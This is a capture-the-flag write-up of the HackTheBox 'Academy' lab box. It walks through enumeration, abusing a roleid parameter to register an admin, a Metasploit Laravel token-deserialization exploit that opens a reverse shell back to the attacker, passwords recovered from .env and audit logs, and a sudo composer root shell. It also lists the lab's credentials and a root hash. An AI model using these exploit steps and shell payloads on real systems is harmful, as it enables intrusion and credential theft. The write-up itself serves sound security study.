# Academy - Easy 

Being a box that was intended to announce the launch of a new HackTheBox service, Academy, it was intended to be an easy one with a lot of solves, but with some not so fun techniques.

### Initial enumeration
After the first nmap scan using `nmap -sC -sV -oN nmap/all -p- -v academy.htb` we get 3 ports open: 22 (SSH), 80(WEB) and 33060(mysqlx?). 

```
# Nmap 7.80 scan initiated Sat Nov  7 21:18:34 2020 as: nmap -sC -sV -oN nmap/all -p- -v 10.129.34.173
Nmap scan report for 10.129.34.173
Host is up (0.057s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
33060/tcp open  mysqlx?
```

### Starting the web enum

At first, if we try to enter the web using the IP address of the box we get redirected to `academy.htb`. So we must add this to `/etc/hosts` and re-enter. Well, now we have two new links mapped, `login.php` and `register.php`. While looking around the WEB I started in the background a web enum tool called ffuf, `ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://academy.htb//FUZZ -e .php`.

Back to the WEB interface, I've created an account and started looking around. There wasn't really something interesting in there, nothing was interactive. On the source code we can find hard coded an `Authorization: Bearer <sometoken>` but it has no use. Looking over the ffuf output I saw that we have a new page `admin.php`. Here is a simple login screen but if we try to re-enter our previous registered user we can't. 

Because there was nothing more on the webserver I tried to capture the login and register requests into the BurpSuite. On the require request we can see that along with `uid` (which is the username) and `password` we have `confirm` and `roleid` parameters. 

```
uid=test&password=test&confirm=test&roleid=0
```

If we forward this request to the Repeater, we change the `roleid` to 1 and the `uid` to `zatest` (just to make sure the user doesn't exist already) we get a succesfull register.

Now if we head over the `http://academy.htb/admin.php` and we login with `zatest:test` we get redirected to `http://academy.htb/admin-page.php`. 

### Getting the foothold

The `admin-page` has an information disclosure about a subdomain called `dev-staging-01.academy.htb`. If we add this to the `/etc/hosts` and we access it we get an error page specific to Laravel framework. Googling about `Laravel debug mode exploit` we see that there isn't much that we can exploit to lead to RCE, but there is a information disclosure about APP_KEY and Database credentials. If we dig a little deeper in the google we get a metasploit module that leads to RCE using [Laravel Token deserialization](https://www.rapid7.com/db/modules/exploit/unix/http/laravel_token_unserialize_exec) . This is the setup I've used for the metasploit: 

```
msf5 > use exploit/unix/http/laravel_token_unserialize_exec
[*] Using configured payload cmd/unix/reverse_perl
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set lhost tun0
lhost => tun0
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set rhosts 10.129.35.176
rhosts => 10.129.35.176
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set vhost dev-staging-01.academy.htb
vhost => dev-staging-01.academy.htb
msf5 exploit(unix/http/laravel_token_unserialize_exec) > set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_KEY => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
msf5 exploit(unix/http/laravel_token_unserialize_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.139:4444 
[*] Command shell session 1 opened (10.10.14.139:4444 -> 10.129.35.176:47088) at 2020-11-08 12:31:58 +0200

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

And we get the shell ass www-data. I made it tty with `python3 -c 'import pty; pty.spawn("/bin/bash")'`. From now I've started looking over files, `.env` from both webservers. And on the `academy/.env` I've got some database credentials but unfortunetly they didn't worked on mysql. Insted because the password seemed complex it could've been the password for user. So I've looked in the `/home` directory and tried to get the user folder which hash the `user.txt` file. I found the match at `cry0l1t3:mySup3rP4s5w0rd!!`
```
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
```

### Privesc to the mrb3n

Now that I have a shell as cry0l1t3, I've uploaded linpeas to the box and started the script. After it was finished, I saw that we are in the `adm` directory and we can read a bunch of files from `/var/log`. Here I've spent some time, until I got to the `/var/log/audit/`. The file that contained the sensitive information is in `Aug 23 21:45 /var/log/audit/audit.log.3
` and it was an easy spot because this was done around that time when this box was created. Going a few lines down we can spot this sequence which contains data encoded in HEX:

```
type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm="sh" data=7375206D7262336E0A
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
```
If we decode it we get to
```
su mrb3n
mrb3n_Ac@d3my!
```
Now if we repete this exact two steps we get the shell as mrb3n.

### Getting the root

New user, new enum... but before I've started the linpeas again, I've did a basic check of `whoami`, looked inside `/home/mrb3n` and checked the `sudo -l`. Well this was a good hit because 
we are able to sudo on composer. This is a basic GTFOBins privesc which has [sudo](https://gtfobins.github.io/gtfobins/composer/#sudo) access.

```
mrb3n@academy:~$ sudo -l
[sudo] password for mrb3n: 
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

Now I've recreated this steps and got the root user. PWNED.
```
mrb3n@academy:~$ TF=$(mktemp -d)
mrb3n@academy:~$ echo '{"scripts":{"x":"/bin/bash -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
mrb3n@academy:~$ sudo composer --working-dir=$TF run-script x
PHP Warning:  Not important...
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# id
uid=0(root) gid=0(root) groups=0(root)
```



# Credentials
- cry0l1t3:mySup3rP4s5w0rd!! (user)
- mrb3n:mrb3n_Ac@d3my! (second user)
- $6$Haots4JVo2R7o2wP$XxlDAw9FgIGHZapROvxiKByJrGiZT0KHkoB9mLC4npT9wDOFsO3p9ad0ScF3tCKT.hk7uweN7KDK4EcmBEKv./ (root hash)